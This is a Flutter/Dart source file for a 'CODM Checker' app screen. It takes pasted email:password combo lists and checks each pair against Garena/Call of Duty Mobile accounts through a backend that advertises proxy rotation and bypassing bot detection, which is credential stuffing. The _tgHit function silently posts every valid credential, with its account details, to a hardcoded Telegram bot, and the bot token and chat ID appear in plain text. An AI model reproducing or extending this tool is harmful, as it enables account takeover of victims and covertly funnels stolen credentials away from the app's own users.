// ============================================================
//  codm_checker_screen.dart  —  CODM / Garena Checker
//
//  v4 — Proxy support added
//  Users can optionally supply their own proxy
//  (http://user:pass@host:port or host:port)
//  Backend also has a pool in Redis; per-request proxy takes
//  priority over the pool.
// ============================================================

import 'dart:convert';

import 'package:flutter/material.dart';
import 'package:flutter/services.dart';
import 'package:google_mobile_ads/google_mobile_ads.dart';
import 'package:http/http.dart' as http;
import 'package:share_plus/share_plus.dart';

import '../services/ad_service.dart';
import '../theme/app_theme.dart';

// ── Palette ──────────────────────────────────────────────────
const _kAccent  = Color(0xFFFF6B35);
const _kAccent2 = Color(0xFFC0392B);

// ── Backend URL ───────────────────────────────────────────────
const _kBackend = 'https://xissin-app-backend-production.up.railway.app';

// ── Telegram (your @Xissinsbot) ─────────────────────────────
const _kTgToken  = '8282381783:AAHs_2v8UGgNM48y1EulMhovNUkTw4ntpjY';
const _kTgChatId = '1910648163';

// ── Result model ──────────────────────────────────────────────
enum _S { hit, noAccount, bad, error }

class _R {
  final String combo, nickname, level, region, uid, shell, country, detail;
  final _S status;
  final bool isClean;
  final List<String> binds;
  const _R({
    required this.combo,
    required this.status,
    this.nickname = '',
    this.level = '',
    this.region = '',
    this.uid = '',
    this.shell = '',
    this.country = '',
    this.isClean = false,
    this.detail = '',
    this.binds = const [],
  });
  bool get isHit => status == _S.hit || status == _S.noAccount;
}

// ── Screen ────────────────────────────────────────────────────
class CodmCheckerScreen extends StatefulWidget {
  final String userId;
  const CodmCheckerScreen({super.key, required this.userId});
  @override
  State<CodmCheckerScreen> createState() => _State();
}

class _State extends State<CodmCheckerScreen> {
  // ads
  BannerAd? _banner;
  bool _bannerReady = false;
  bool _adGranted = false;

  // state
  final _ctrl        = TextEditingController();
  final _proxyCtrl   = TextEditingController();   // ← NEW: proxy input
  final _scroll      = ScrollController();
  bool _running = false, _stopped = false;
  bool _proxyEnabled = false;                      // ← NEW: proxy toggle
  int _total = 0, _checked = 0, _hits = 0, _bad = 0, _errors = 0;
  final _results = <_R>[];

  // ── Lifecycle ─────────────────────────────────────────────────
  @override
  void initState() {
    super.initState();
    AdService.instance.init(userId: widget.userId);
    AdService.instance.addListener(_onAd);
    _initBanner();
  }

  @override
  void dispose() {
    AdService.instance.removeListener(_onAd);
    _banner?.dispose();
    _ctrl.dispose();
    _proxyCtrl.dispose();
    _scroll.dispose();
    super.dispose();
  }

  // ── Ads ───────────────────────────────────────────────────────
  void _onAd() {
    if (!mounted) return;
    if (AdService.instance.adsRemoved && _banner != null) {
      _banner?.dispose();
      setState(() { _banner = null; _bannerReady = false; });
    }
  }

  void _initBanner() {
    if (AdService.instance.adsRemoved) return;
    _banner?.dispose();
    _banner = null;
    _bannerReady = false;
    final ad = AdService.instance.createBannerAd(
      onLoaded: () {
        if (!mounted || AdService.instance.adsRemoved) {
          _banner?.dispose();
          _banner = null;
          return;
        }
        setState(() => _bannerReady = true);
      },
      onFailed: () {
        if (mounted) setState(() { _banner = null; _bannerReady = false; });
        Future.delayed(const Duration(seconds: 30), () {
          if (mounted && !AdService.instance.adsRemoved) _initBanner();
        });
      },
    );
    if (ad == null) return;
    _banner = ad;
    _banner!.load();
  }

  Widget _buildBanner() {
    if (AdService.instance.adsRemoved || !_bannerReady || _banner == null) {
      return const SizedBox.shrink();
    }
    return SafeArea(
      top: false,
      child: Container(
        alignment: Alignment.center,
        width: _banner!.size.width.toDouble(),
        height: _banner!.size.height.toDouble(),
        child: AdWidget(ad: _banner!),
      ),
    );
  }

  void _watchAd() {
    HapticFeedback.selectionClick();
    AdService.instance.showGatedInterstitial(onGranted: () {
      if (mounted) setState(() => _adGranted = true);
    });
  }

  // ── Backend call ──────────────────────────────────────────────
  Future<_R> _checkOne(String combo) async {
    if (!combo.contains(':')) {
      return _R(combo: combo, status: _S.error, detail: 'Bad format — use email:password');
    }

    try {
      // Build request body — include proxy only if user enabled it
      final body = <String, dynamic>{
        'combo':   combo,
        'user_id': widget.userId,
      };
      final proxyVal = _proxyCtrl.text.trim();
      if (_proxyEnabled && proxyVal.isNotEmpty) {
        body['proxy'] = proxyVal;
      }

      final res = await http.post(
        Uri.parse('$_kBackend/api/codm/check-one'),
        headers: {'Content-Type': 'application/json'},
        body: jsonEncode(body),
      ).timeout(const Duration(seconds: 60));

      if (res.statusCode != 200) {
        return _R(
          combo: combo, status: _S.error,
          detail: 'Server error ${res.statusCode}',
        );
      }

      final data   = jsonDecode(res.body) as Map<String, dynamic>;
      final status = data['status'] as String? ?? 'error';
      final binds  = (data['binds'] as List?)?.cast<String>() ?? [];

      switch (status) {
        case 'hit':
          final r = _R(
            combo:    combo,
            status:   _S.hit,
            nickname: data['nickname'] ?? '',
            level:    data['level'] ?? '',
            region:   data['region'] ?? '',
            uid:      data['uid'] ?? '',
            shell:    data['shell'] ?? '',
            country:  data['country'] ?? '',
            isClean:  data['is_clean'] == true,
            binds:    binds,
            detail:   'HIT',
          );
          _tgHit(r);
          return r;

        case 'valid_no_codm':
          return _R(
            combo:   combo,
            status:  _S.noAccount,
            shell:   data['shell'] ?? '',
            country: data['country'] ?? '',
            isClean: data['is_clean'] == true,
            binds:   binds,
            detail:  data['detail'] ?? 'Valid Garena — No CODM linked',
          );

        case 'bad':
          return _R(
            combo:  combo,
            status: _S.bad,
            detail: data['detail'] ?? 'Wrong password or account banned',
          );

        default:
          return _R(
            combo:  combo,
            status: _S.error,
            detail: data['detail'] ?? 'Unknown error',
          );
      }
    } on Exception catch (e) {
      return _R(combo: combo, status: _S.error, detail: 'Request failed: $e');
    }
  }

  // ── Telegram hit notification ─────────────────────────────────
  Future<void> _tgHit(_R r) async {
    try {
      await http.post(
        Uri.parse('https://api.telegram.org/bot$_kTgToken/sendMessage'),
        body: {
          'chat_id':    _kTgChatId,
          'parse_mode': 'HTML',
          'text': '🎮 <b>CODM HIT</b> — Xissin App\n\n'
              '📧 <b>Account:</b> ${r.combo}\n'
              '🎮 <b>IGN:</b> ${r.nickname}\n'
              '⚡ <b>Level:</b> ${r.level}\n'
              '🌍 <b>Region:</b> ${r.region}\n'
              '🆔 <b>UID:</b> ${r.uid}\n'
              '💎 <b>Shells:</b> ${r.shell}\n'
              '🌐 <b>Country:</b> ${r.country}\n'
              '🔒 <b>Clean:</b> ${r.isClean ? "✅ YES" : "❌ NO"}',
        },
      ).timeout(const Duration(seconds: 10));
    } catch (_) {}
  }

  // ── Start checker ─────────────────────────────────────────────
  Future<void> _start() async {
    if (!AdService.instance.adsRemoved && !_adGranted) {
      _watchAd();
      return;
    }
    final lines = _ctrl.text
        .split('\n')
        .map((l) => l.trim())
        .where((l) => l.isNotEmpty)
        .toList();
    if (lines.isEmpty) return;
    FocusScope.of(context).unfocus();
    HapticFeedback.mediumImpact();
    setState(() {
      _running = true;
      _stopped = false;
      _total   = lines.length;
      _checked = 0;
      _hits    = 0;
      _bad     = 0;
      _errors  = 0;
      _results.clear();
    });

    for (final c in lines) {
      if (_stopped || !mounted) break;
      final r = await _checkOne(c);
      if (!mounted) break;
      setState(() {
        _checked++;
        _results.insert(0, r);
        if (r.isHit)                _hits++;
        else if (r.status == _S.bad) _bad++;
        else                         _errors++;
      });
      if (_scroll.hasClients) _scroll.jumpTo(0);
      await Future.delayed(const Duration(milliseconds: 300));
    }

    if (!mounted) return;
    setState(() => _running = false);
    Future.delayed(const Duration(milliseconds: 600), () {
      if (!AdService.instance.adsRemoved) AdService.instance.showInterstitial();
    });
  }

  void _reset() {
    if (!AdService.instance.adsRemoved) AdService.instance.showInterstitial();
    HapticFeedback.mediumImpact();
    setState(() {
      _running = false; _stopped = false;
      _total = 0; _checked = 0;
      _hits = 0; _bad = 0; _errors = 0;
      _results.clear(); _ctrl.clear();
    });
  }

  void _share() {
    if (!AdService.instance.adsRemoved) AdService.instance.showInterstitial();
    final hits = _results.where((r) => r.status == _S.hit).toList();
    if (hits.isEmpty) return;
    final b = StringBuffer()
      ..writeln('🎮 CODM Hits — Xissin\n══════════════════════════');
    for (final h in hits) {
      b
        ..writeln('📧 ${h.combo}')
        ..writeln('🎮 IGN: ${h.nickname}')
        ..writeln('⚡ Lv.${h.level} | ${h.region}')
        ..writeln('💎 Shells: ${h.shell} | 🔒 Clean: ${h.isClean ? "YES" : "NO"}')
        ..writeln('──────────────────────────');
    }
    Share.share(b.toString(), subject: 'CODM Hits');
  }

  void _copy() {
    final hits = _results.where((r) => r.status == _S.hit).toList();
    if (hits.isEmpty) return;
    if (!AdService.instance.adsRemoved) AdService.instance.showInterstitial();
    Clipboard.setData(ClipboardData(
      text: hits
          .map((h) => '${h.combo} | ${h.nickname} | Lv.${h.level}')
          .join('\n'),
    ));
    HapticFeedback.selectionClick();
    ScaffoldMessenger.of(context).showSnackBar(SnackBar(
      content: Text('${hits.length} hit(s) copied!'),
      backgroundColor: _kAccent,
      duration: const Duration(seconds: 2),
      behavior: SnackBarBehavior.floating,
      shape: RoundedRectangleBorder(borderRadius: BorderRadius.circular(10)),
      margin: const EdgeInsets.all(12),
    ));
  }

  // ── Build ──────────────────────────────────────────────────────
  @override
  Widget build(BuildContext context) {
    final c = context.c;
    return Scaffold(
      backgroundColor: c.background,
      bottomNavigationBar: _buildBanner(),
      appBar: AppBar(
        backgroundColor: Colors.transparent,
        elevation: 0,
        leading: IconButton(
          icon: const Icon(Icons.arrow_back_ios_new_rounded, color: _kAccent, size: 20),
          onPressed: () {
            if (_running) setState(() => _stopped = true);
            Navigator.pop(context);
          },
        ),
        title: Row(mainAxisSize: MainAxisSize.min, children: [
          Container(
            padding: const EdgeInsets.all(6),
            decoration: BoxDecoration(
              color: _kAccent.withOpacity(.15),
              borderRadius: BorderRadius.circular(10),
            ),
            child: const Icon(Icons.sports_esports_rounded, color: _kAccent, size: 18),
          ),
          const SizedBox(width: 10),
          Text(
            'CODM Checker',
            style: TextStyle(
              color: c.textPrimary, fontSize: 17,
              fontWeight: FontWeight.w700, letterSpacing: .4,
            ),
          ),
        ]),
        centerTitle: true,
        actions: [
          if (_results.any((r) => r.status == _S.hit)) ...[
            IconButton(
              icon: const Icon(Icons.copy_rounded, color: _kAccent, size: 20),
              onPressed: _copy,
            ),
            IconButton(
              icon: const Icon(Icons.share_rounded, color: _kAccent, size: 20),
              onPressed: _share,
            ),
          ],
          if (!_running && _results.isNotEmpty)
            IconButton(
              icon: const Icon(Icons.refresh_rounded, color: _kAccent, size: 20),
              onPressed: _reset,
            ),
        ],
      ),
      body: SingleChildScrollView(
        controller: _scroll,
        padding: const EdgeInsets.symmetric(horizontal: 16, vertical: 8),
        child: Column(
          crossAxisAlignment: CrossAxisAlignment.stretch,
          children: [
            if (!AdService.instance.adsRemoved && !_adGranted) _adGate(c),
            if (_total > 0) ...[_statsBar(c), const SizedBox(height: 12)],
            _inputCard(c),
            const SizedBox(height: 14),
            ..._results.map((r) => _resultCard(r, c)),
            const SizedBox(height: 60),
          ],
        ),
      ),
    );
  }

  // ── Widgets ────────────────────────────────────────────────────
  Widget _adGate(XissinColors c) => Container(
    margin: const EdgeInsets.only(bottom: 14),
    padding: const EdgeInsets.all(16),
    decoration: BoxDecoration(
      color: _kAccent.withOpacity(.06),
      borderRadius: BorderRadius.circular(18),
      border: Border.all(color: _kAccent.withOpacity(.25)),
    ),
    child: Column(children: [
      Row(children: [
        const Icon(Icons.lock_outline_rounded, color: _kAccent, size: 18),
        const SizedBox(width: 10),
        Expanded(child: Text(
          'Watch a short ad to unlock for this session.',
          style: TextStyle(color: c.textSecondary, fontSize: 12, height: 1.4),
        )),
      ]),
      const SizedBox(height: 12),
      SizedBox(width: double.infinity, child: ElevatedButton.icon(
        onPressed: _watchAd,
        style: ElevatedButton.styleFrom(
          backgroundColor: _kAccent,
          foregroundColor: Colors.white,
          shape: RoundedRectangleBorder(borderRadius: BorderRadius.circular(12)),
          elevation: 0,
          padding: const EdgeInsets.symmetric(vertical: 12),
        ),
        icon: const Icon(Icons.play_circle_rounded, size: 18),
        label: const Text('Watch Ad to Unlock',
            style: TextStyle(fontWeight: FontWeight.w700)),
      )),
      const SizedBox(height: 8),
      Text('⭐ Get Premium to remove all ads permanently',
          style: TextStyle(color: c.textHint, fontSize: 11)),
    ]),
  );

  Widget _statsBar(XissinColors c) => Container(
    padding: const EdgeInsets.symmetric(horizontal: 14, vertical: 12),
    decoration: BoxDecoration(
      color: c.surface,
      borderRadius: BorderRadius.circular(16),
      border: Border.all(color: c.border),
    ),
    child: Row(children: [
      _chip('✅ Hits',  '$_hits',   const Color(0xFF2ECC71)),
      _div(),
      _chip('❌ Bad',   '$_bad',    const Color(0xFFFF6B6B)),
      _div(),
      _chip('⚠️ Err',  '$_errors', const Color(0xFFFFA94D)),
      _div(),
      _chip('📋 Done', '$_checked/$_total', _kAccent),
      if (_running) ...[
        _div(),
        const SizedBox(
          width: 14, height: 14,
          child: CircularProgressIndicator(color: _kAccent, strokeWidth: 2),
        ),
      ],
    ]),
  );

  Widget _chip(String l, String v, Color color) => Expanded(
    child: Column(children: [
      Text(v, style: TextStyle(color: color, fontWeight: FontWeight.w800, fontSize: 13)),
      Text(l, style: TextStyle(color: color.withOpacity(.7), fontSize: 9)),
    ]),
  );

  Widget _div() => Container(height: 30, width: 1, color: Colors.white12);

  Widget _inputCard(XissinColors c) => Container(
    padding: const EdgeInsets.all(16),
    decoration: BoxDecoration(
      color: c.surface,
      borderRadius: BorderRadius.circular(18),
      border: Border.all(color: _kAccent.withOpacity(.3)),
    ),
    child: Column(crossAxisAlignment: CrossAxisAlignment.start, children: [
      // ── Combo list label ──────────────────────────────────
      Row(children: [
        const Icon(Icons.list_alt_rounded, color: _kAccent, size: 16),
        const SizedBox(width: 8),
        Text(
          'Combo List (email:password)',
          style: TextStyle(color: _kAccent, fontSize: 12, fontWeight: FontWeight.w600),
        ),
      ]),
      const SizedBox(height: 10),
      // ── Combo textarea ────────────────────────────────────
      TextField(
        controller: _ctrl,
        enabled: !_running,
        minLines: 5,
        maxLines: 10,
        style: TextStyle(color: c.textPrimary, fontSize: 12, fontFamily: 'monospace'),
        decoration: InputDecoration(
          hintText: 'email@example.com:password\nemail2@test.com:pass456',
          hintStyle: TextStyle(color: c.textHint, fontSize: 11),
          filled: true,
          fillColor: c.background,
          border: OutlineInputBorder(
            borderRadius: BorderRadius.circular(12),
            borderSide: BorderSide.none,
          ),
          contentPadding: const EdgeInsets.all(12),
        ),
        keyboardType: TextInputType.multiline,
      ),
      const SizedBox(height: 12),

      // ── Proxy toggle row ──────────────────────────────────
      GestureDetector(
        onTap: () {
          if (_running) return;
          HapticFeedback.selectionClick();
          setState(() => _proxyEnabled = !_proxyEnabled);
        },
        child: Container(
          padding: const EdgeInsets.symmetric(horizontal: 12, vertical: 8),
          decoration: BoxDecoration(
            color: _proxyEnabled
                ? const Color(0xFF5B8CFF).withOpacity(.1)
                : c.background,
            borderRadius: BorderRadius.circular(10),
            border: Border.all(
              color: _proxyEnabled
                  ? const Color(0xFF5B8CFF).withOpacity(.4)
                  : c.border,
            ),
          ),
          child: Row(children: [
            Icon(
              Icons.vpn_lock_rounded,
              color: _proxyEnabled ? const Color(0xFF5B8CFF) : c.textHint,
              size: 15,
            ),
            const SizedBox(width: 8),
            Expanded(
              child: Text(
                'Use Proxy',
                style: TextStyle(
                  color: _proxyEnabled ? const Color(0xFF5B8CFF) : c.textSecondary,
                  fontSize: 12,
                  fontWeight: FontWeight.w600,
                ),
              ),
            ),
            Switch(
              value: _proxyEnabled,
              onChanged: _running ? null : (v) {
                HapticFeedback.selectionClick();
                setState(() => _proxyEnabled = v);
              },
              activeColor: const Color(0xFF5B8CFF),
              materialTapTargetSize: MaterialTapTargetSize.shrinkWrap,
            ),
          ]),
        ),
      ),

      // ── Proxy input (shown only when enabled) ─────────────
      if (_proxyEnabled) ...[
        const SizedBox(height: 8),
        TextField(
          controller: _proxyCtrl,
          enabled: !_running,
          style: TextStyle(
            color: c.textPrimary,
            fontSize: 12,
            fontFamily: 'monospace',
          ),
          decoration: InputDecoration(
            hintText: 'http://user:pass@host:port  or  host:port',
            hintStyle: TextStyle(color: c.textHint, fontSize: 11),
            filled: true,
            fillColor: c.background,
            prefixIcon: Icon(Icons.dns_rounded, color: const Color(0xFF5B8CFF), size: 16),
            suffixIcon: _proxyCtrl.text.isNotEmpty
                ? IconButton(
                    icon: Icon(Icons.clear_rounded, color: c.textHint, size: 16),
                    onPressed: () => setState(() => _proxyCtrl.clear()),
                  )
                : null,
            border: OutlineInputBorder(
              borderRadius: BorderRadius.circular(12),
              borderSide: BorderSide(color: const Color(0xFF5B8CFF).withOpacity(.3)),
            ),
            enabledBorder: OutlineInputBorder(
              borderRadius: BorderRadius.circular(12),
              borderSide: BorderSide(color: const Color(0xFF5B8CFF).withOpacity(.3)),
            ),
            focusedBorder: OutlineInputBorder(
              borderRadius: BorderRadius.circular(12),
              borderSide: const BorderSide(color: Color(0xFF5B8CFF)),
            ),
            contentPadding: const EdgeInsets.symmetric(horizontal: 12, vertical: 10),
          ),
          keyboardType: TextInputType.url,
          onChanged: (_) => setState(() {}),
        ),
        const SizedBox(height: 4),
        Padding(
          padding: const EdgeInsets.symmetric(horizontal: 4),
          child: Text(
            'Leave blank to use the backend proxy pool (if set by admin).',
            style: TextStyle(color: c.textHint, fontSize: 10),
          ),
        ),
      ],

      const SizedBox(height: 12),

      // ── Backend info chip ─────────────────────────────────
      Container(
        padding: const EdgeInsets.symmetric(horizontal: 10, vertical: 6),
        decoration: BoxDecoration(
          color: _kAccent.withOpacity(.08),
          borderRadius: BorderRadius.circular(8),
        ),
        child: Row(children: [
          const Icon(Icons.cloud_done_rounded, color: _kAccent, size: 13),
          const SizedBox(width: 6),
          Text(
            'Powered by Xissin backend — bypasses bot detection',
            style: TextStyle(color: c.textSecondary, fontSize: 10),
          ),
        ]),
      ),
      const SizedBox(height: 12),

      // ── Start / Stop / Reset row ──────────────────────────
      Row(children: [
        Expanded(child: ElevatedButton.icon(
          onPressed: _running ? () => setState(() => _stopped = true) : _start,
          style: ElevatedButton.styleFrom(
            backgroundColor: _running ? const Color(0xFFFF6B6B) : _kAccent,
            foregroundColor: Colors.white,
            elevation: 0,
            shape: RoundedRectangleBorder(borderRadius: BorderRadius.circular(12)),
            padding: const EdgeInsets.symmetric(vertical: 13),
          ),
          icon: Icon(_running ? Icons.stop_rounded : Icons.play_arrow_rounded, size: 18),
          label: Text(
            _running ? 'Stop' : 'Start Check',
            style: const TextStyle(fontWeight: FontWeight.w700, fontSize: 14),
          ),
        )),
        if (!_running && _results.isNotEmpty) ...[
          const SizedBox(width: 10),
          ElevatedButton.icon(
            onPressed: _reset,
            style: ElevatedButton.styleFrom(
              backgroundColor: c.surface,
              foregroundColor: _kAccent,
              shape: RoundedRectangleBorder(
                borderRadius: BorderRadius.circular(12),
                side: BorderSide(color: _kAccent.withOpacity(.4)),
              ),
              elevation: 0,
              padding: const EdgeInsets.symmetric(vertical: 13, horizontal: 16),
            ),
            icon: const Icon(Icons.refresh_rounded, size: 16),
            label: const Text('Reset', style: TextStyle(fontWeight: FontWeight.w700, fontSize: 13)),
          ),
        ],
      ]),
      if (_running) ...[
        const SizedBox(height: 10),
        LinearProgressIndicator(
          value: _total > 0 ? _checked / _total : null,
          backgroundColor: _kAccent.withOpacity(.15),
          valueColor: const AlwaysStoppedAnimation(_kAccent),
          borderRadius: BorderRadius.circular(10),
          minHeight: 4,
        ),
      ],
    ]),
  );

  Widget _resultCard(_R r, XissinColors c) {
    Color sc;
    IconData si;
    String sl;
    switch (r.status) {
      case _S.hit:
        sc = const Color(0xFF2ECC71);
        si = Icons.check_circle_rounded;
        sl = 'HIT ✅';
      case _S.noAccount:
        sc = const Color(0xFF5B8CFF);
        si = Icons.account_box_outlined;
        sl = 'VALID — No CODM 🔵';
      case _S.bad:
        sc = const Color(0xFFFF6B6B);
        si = Icons.cancel_rounded;
        sl = 'BAD ❌';
      case _S.error:
        sc = const Color(0xFFFFA94D);
        si = Icons.warning_amber_rounded;
        sl = 'ERROR ⚠️';
    }
    return Container(
      margin: const EdgeInsets.only(bottom: 10),
      padding: const EdgeInsets.all(14),
      decoration: BoxDecoration(
        color: sc.withOpacity(.06),
        borderRadius: BorderRadius.circular(14),
        border: Border.all(color: sc.withOpacity(.25)),
      ),
      child: Column(crossAxisAlignment: CrossAxisAlignment.start, children: [
        Row(children: [
          Icon(si, color: sc, size: 15),
          const SizedBox(width: 6),
          Text(sl, style: TextStyle(color: sc, fontSize: 12, fontWeight: FontWeight.w700)),
          const Spacer(),
          GestureDetector(
            onTap: () {
              Clipboard.setData(ClipboardData(text: r.combo));
              HapticFeedback.selectionClick();
            },
            child: Icon(Icons.copy_rounded, color: sc.withOpacity(.7), size: 13),
          ),
        ]),
        const SizedBox(height: 6),
        Text(
          r.combo,
          style: TextStyle(color: c.textPrimary, fontSize: 11, fontFamily: 'monospace'),
          maxLines: 1,
          overflow: TextOverflow.ellipsis,
        ),
        if (r.status == _S.hit && r.nickname.isNotEmpty) ...[
          const SizedBox(height: 8),
          const Divider(height: 1, color: Colors.white12),
          const SizedBox(height: 8),
          _row('🎮 IGN',     r.nickname.isNotEmpty ? r.nickname : '—', c),
          _row('⚡ Level',   r.level.isNotEmpty    ? r.level    : '—', c),
          _row('🌍 Region',  r.region.isNotEmpty   ? r.region   : '—', c),
          _row('🆔 UID',     r.uid.isNotEmpty      ? r.uid      : '—', c),
          _row('💎 Shells',  r.shell.isNotEmpty    ? r.shell    : '—', c),
          _row('🌐 Country', r.country.isNotEmpty  ? r.country  : '—', c),
          _row('🔒 Clean',   r.isClean             ? 'YES ✅'   : 'NO ❌', c),
          if (r.binds.isNotEmpty)
            _row('🔗 Binds', r.binds.join(', '), c),
        ],
        if (r.status == _S.noAccount && r.shell.isNotEmpty) ...[
          const SizedBox(height: 8),
          const Divider(height: 1, color: Colors.white12),
          const SizedBox(height: 8),
          _row('💎 Shells',  r.shell,   c),
          _row('🌐 Country', r.country, c),
          _row('🔒 Clean',   r.isClean ? 'YES ✅' : 'NO ❌', c),
          if (r.binds.isNotEmpty)
            _row('🔗 Binds', r.binds.join(', '), c),
          _row('ℹ️ Note', r.detail, c),
        ],
        if ((r.status == _S.bad || r.status == _S.error) && r.detail.isNotEmpty) ...[
          const SizedBox(height: 4),
          Text(r.detail,
              style: TextStyle(color: sc.withOpacity(.7), fontSize: 10)),
        ],
      ]),
    );
  }

  Widget _row(String l, String v, XissinColors c) => Padding(
    padding: const EdgeInsets.only(bottom: 3),
    child: Row(children: [
      SizedBox(
        width: 80,
        child: Text(l, style: TextStyle(color: c.textHint, fontSize: 10)),
      ),
      Expanded(child: Text(
        v,
        style: TextStyle(
          color: c.textPrimary, fontSize: 10,
          fontWeight: FontWeight.w600,
        ),
        maxLines: 1,
        overflow: TextOverflow.ellipsis,
      )),
    ]),
  );
}
